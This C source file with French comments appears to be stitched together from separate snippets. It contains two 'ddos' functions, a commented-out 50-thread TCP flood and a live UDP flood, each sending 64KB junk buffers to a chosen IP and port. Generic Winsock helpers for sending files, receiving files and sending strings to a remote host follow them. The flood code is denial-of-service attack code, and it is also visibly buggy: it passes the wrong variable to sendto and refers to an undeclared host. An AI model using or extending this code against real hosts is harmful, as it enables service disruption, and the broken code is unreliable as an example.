/*
	//Création du patern du thread
	
	DWORD WINAPI WorkerThread(PVOID Parameter)
	{
		SOCKET Socket;
		char data[65536]; // Création d'un tableau de char
	
		memset(data,0xCC,65536); // Création d'un tableau remplie de 65536 fois "0xCC"
	
		while(1) //Boucle d'envoie infinie (qui sera combiné a 50+ thread)
		{
			Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP); // Déclaration d'un socket en TCP -> Ipv4
	
			connect(Socket,(sockaddr*)&sai,sizeof(sai)); //Connection a la cible 
			send(Socket,data,65536,0); // Envoie des données via le socket
	
			Sleep(10); // Attendre 10ms
			send(Socket,data,65536,0); // Renvoie des données via le socket 
	
			closesocket(Socket); //Fermeture du socket 
	
			Sleep(10);
		}
	
		return 0;
	}


int ddos(int port, char* addip)
{

 	int i; // Déclaration de i pour le compteur de thread 
    WSADATA wd;
    if(WSAStartup(0x101,&wd)!=0)
    {
        return 1;
    }
    //host=gethostbyname(argv[1]);
    if(!host)
    {
        return 1;
    }
 
    sai.sin_family=AF_INET;
	sai.sin_port = htons(port);
	sai.sin_addr.s_addr =inet_addr(addip ); 
	//inet_pton(addip, &sai.sin_addr.s_addr);

    //sai.sin_addr=*((LPIN_ADDR)*host->h_addr_list);
    //sai.sin_port=htons(port);
 
    // Création d'une boucle pour créer 50 thread 
    for(i=0;i<50;i++)
    {
        CreateThread(NULL,0,WorkerThread,NULL,0,NULL); //Créer un thread avec WorkerThread et ses differents param
    }


}
*/






int ddos(int port, char * addrip)
{
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    /* - Initialisation du socket - */

	BYTE data[0xFFFF]; // Création d'un tableau de byte de taille 0xFFFF -> Soit 65535 bytes -> 64kb
	memset(data,0xCC,0xFFFF); // Remplis le tableau de byte de 0xCC 0xFFFF foisl

	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr(addrip);
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(port);
	sock = socket(AF_INET,SOCK_DGRAM,0);
	bind(sock, (SOCKADDR *)&sin, sizeof(sin));
	sendto(socket, data, sizeof(data), 0, &sin, sizeof(sin));
	/* - Fermeture du socket - */

    WSACleanup();
    return 0;

}


#include <stdio.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 1024

int send_file(SOCKET sock, const char* file_name) {
  // Open the file to be sent
  FILE* file = fopen(file_name, "rb");
  if (file == NULL) {
    printf("Error opening file\n");
    return -1;
  }

  // Get the size of the file
  fseek(file, 0, SEEK_END);
  int file_size = ftell(file);
  rewind(file);

  // Send the file size to the client
  send(sock, (char*)&file_size, sizeof(file_size), 0);

  // Send the file contents to the client
  char buffer[BUFFER_SIZE];
  int bytes_read;
  while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
    send(sock, buffer, bytes_read, 0);
  }

  // Close the file and the socket
  fclose(file);

  return 0;
}




#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#define BUF_SIZE 1024

int receive_file(SOCKET sock, char* filename)
{
    FILE* fp = fopen(filename, "wb");
    if (fp == NULL)
    {
        printf("Error opening file for writing.\n");
        return -1;
    }

    char buffer[BUF_SIZE];
    int bytes_received;
    while ((bytes_received = recv(sock, buffer, BUF_SIZE, 0)) > 0)
    {
        fwrite(buffer, 1, bytes_received, fp);
    }

    fclose(fp);
    return 0;
}


#include <stdio.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

void send_string(const char* str, const char* address, unsigned short port)
{
    // Initialize Winsock
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        fprintf(stderr, "WSAStartup failed.\n");
        return;
    }

    // Create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, "Failed to create socket.\n");
        WSACleanup();
        return;
    }

    // Resolve server address and port
    struct hostent* server = gethostbyname(address);
    if (server == NULL) {
        fprintf(stderr, "Failed to resolve server address.\n");
        closesocket(sock);
        WSACleanup();
        return;
    }

    SOCKADDR_IN server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(port);
    memcpy(&server_address.sin_addr.s_addr, server->h_addr, server->h_length);

    // Connect to server
    if (connect(sock, (SOCKADDR*)&server_address, sizeof(server_address)) != 0) {
        fprintf(stderr, "Failed to connect to server.\n");
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Send string
    int result = send(sock, str, strlen(str), 0);
    if (result == SOCKET_ERROR) {
        fprintf(stderr, "Failed to send string.\n");
    } else {
        printf("Sent string: %s\n", str);
    }

    // Close socket and cleanup
    closesocket(sock);
    WSACleanup();
}
